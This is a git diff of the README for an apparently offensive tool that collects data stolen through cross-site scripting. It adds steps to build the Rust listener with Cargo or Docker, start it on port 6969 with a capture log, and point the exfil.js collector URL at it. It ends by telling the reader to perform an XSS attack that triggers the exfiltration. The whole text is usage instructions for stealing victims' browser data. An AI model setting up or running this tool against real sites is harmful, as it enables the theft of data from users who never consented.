@@ -3,13 +3,19 @@
 Use XSS attacks to exfiltrate useful data!
 
 ## How To Compile?
+### Using Cargo
 ```bash
 $ git clone https://github.com/whokilleddb/XSS-Data-Exfiltrator
 $ cd XSS-Data-Exfiltrator
 $ cargo build --release
 ```
+### Using Dockerfile
+```bash
+$ sudo DOCKER_BUILDKIT=1 docker build --target export --output type=local,dest=. -t exfil:0.1.0 .
+```
 
 ## Usage
+### Get Help
 ```bash
 $ ./target/release/exfil --help    
 XSS Information Exfiltrator 0.1.0
@@ -25,12 +31,20 @@ OPTIONS:
     -p, --port <port>        Port To Bind To
     -V, --version            Print version information
 ```
+### Start Listener
 ```bash
 $ ./target/release/exfil       
 [+] XSS Exfiltration By @whokilleddb
 [+] Logfile: Capture.log
 [!] Listening on http://0.0.0.0:6969
 ```
+### Modify `exfil.js`
+Update the following Line in `exfil.js`
+```js
+(Line 1) const url = "http://127.0.0.1:6969/"
+```
+### Perform XSS To Exfilterate The Data
+Perform a XSS attack to trigger the `exfil` function from `exfil.js` and viola! you should have your data ready!
 
 ## Sample Output
 ```bash
